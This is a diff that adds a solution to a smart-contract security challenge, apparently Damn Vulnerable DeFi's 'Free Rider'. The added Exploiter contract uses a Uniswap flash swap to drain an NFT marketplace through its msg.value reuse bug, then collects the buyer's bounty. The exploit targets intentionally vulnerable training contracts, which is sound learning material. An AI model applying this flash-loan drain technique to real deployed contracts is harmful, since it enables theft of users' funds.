@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -134,8 +135,10 @@ contract FreeRider is Test {
         /**
          * EXPLOIT START *
          */
-        vm.startPrank(attacker, attacker);
-
+        vm.startPrank(attacker, attacker); // Setting tx.origin as well
+        Exploiter exploiter =
+            new Exploiter(uniswapV2Pair, freeRiderBuyer, freeRiderNFTMarketplace, weth, dvt, damnValuableNFT);
+        exploiter.exploit(NFT_PRICE);
         vm.stopPrank();
         /**
          * EXPLOIT END *
@@ -165,4 +168,85 @@ contract FreeRider is Test {
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
         assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
     }
+}
+
+contract Exploiter {
+    IUniswapV2Pair internal immutable uniswapV2Pair;
+    FreeRiderBuyer internal immutable freeRiderBuyer;
+    FreeRiderNFTMarketplace internal immutable freeRiderNFTMarketplace;
+    WETH9 internal immutable weth;
+    DamnValuableToken internal immutable dvt;
+    DamnValuableNFT internal immutable damnValuableNFT;
+    address internal immutable owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "only owner"); // Modifier to avoid getting front-run by searchers
+        _;
+    }
+
+    constructor(
+        IUniswapV2Pair _uniswapV2Pair,
+        FreeRiderBuyer _freeRiderBuyer,
+        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
+        WETH9 _weth,
+        DamnValuableToken _dvt,
+        DamnValuableNFT _damnValuableNFT
+    ) {
+        uniswapV2Pair = _uniswapV2Pair;
+        freeRiderBuyer = _freeRiderBuyer;
+        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
+        weth = _weth;
+        dvt = _dvt;
+        damnValuableNFT = _damnValuableNFT;
+        owner = msg.sender;
+    }
+
+    function exploit(uint256 _nftPrice) external onlyOwner {
+        uniswapV2Pair.swap(0, _nftPrice, address(this), "12");
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        console.log("balance of ether is: ", address(this).balance);
+        console.log("balance of WETH is: ", weth.balanceOf(address(this)));
+        weth.withdraw(amount1);
+        console.log("balance of ether is: ", address(this).balance);
+        console.log("balance of WETH is: ", weth.balanceOf(address(this)));
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6;) {
+            tokenIds[i] = i;
+            unchecked {
+                i++;
+            }
+        }
+        freeRiderNFTMarketplace.buyMany{value: amount1}(tokenIds);
+        console.log("Balance of NFTS is ", damnValuableNFT.balanceOf(address(this)));
+        transferNFTs(tokenIds);
+        console.log("balance of ether is: ", address(this).balance);
+        console.log("balance of WETH is: ", weth.balanceOf(address(this)));
+        console.log("balance of ether attacker is: ", address(owner).balance);
+        console.log("amount 1 is: ", amount1);
+        uint256 wethRepay = (amount1 * 1006) / 1000;
+        console.log("amount 1 with fee is: ", wethRepay);
+        weth.deposit{value: wethRepay}(); // Flash swap 30bps fee
+        console.log("balance of ether is: ", address(this).balance);
+        console.log("balance of WETH is: ", weth.balanceOf(address(this)));
+        weth.transfer(address(uniswapV2Pair), wethRepay);
+        console.log("balance of ether is: ", address(this).balance);
+        console.log("balance of WETH is: ", weth.balanceOf(address(this)));
+    }
+
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    function transferNFTs(uint256[] memory tokenIds) internal {
+        for (uint256 i = 0; i < tokenIds.length;) {
+            damnValuableNFT.safeTransferFrom(damnValuableNFT.ownerOf(tokenIds[i]), address(freeRiderBuyer), tokenIds[i]);
+            unchecked {
+                i++;
+            }
+        }
+    }
+
+    receive() external payable {}
 }
